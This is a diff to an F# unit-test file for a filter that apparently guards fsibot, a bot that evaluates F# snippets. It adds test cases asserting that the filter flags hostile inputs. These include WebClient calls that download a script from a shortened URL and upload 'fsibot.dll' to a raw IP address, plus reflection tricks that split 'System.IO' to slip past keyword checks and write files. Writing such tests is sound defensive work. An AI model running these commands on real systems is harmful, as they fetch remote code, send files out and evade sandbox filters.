@@ -24,7 +24,10 @@ type ``Filters tests`` () =
 
 //    [<TestCase("""Net.WebClient().DownloadFile("http://dependencywalker.com/depends22_x86 .…","e.zip")""", Result=true)>]
 //    [<TestCase("""@fsibot Assembly.Load([|1uy; 2uy; 3uy|])""", Result=true)>]
-  
+
+    [<TestCase("""@fsibot (http://System.Net    .WebClient()).DownloadFile("http://bit.ly/fugetmaster ","fuget.fsx")""", Result=true)>]
+
+    [<TestCase("""@fsibot System. Net. WebClient().UploadFile("http://176.10.137.206:8086/", "fsibot.dll" """, Result=true)>]
     [<TestCase("""@fsibot System.AppDomain.CreateDomain "test" """, Result=true)>]
     [<TestCase("""@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy|]|])""", Result=true)>]
     [<TestCase("""@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy;101uy]|])""", Result=true)>]
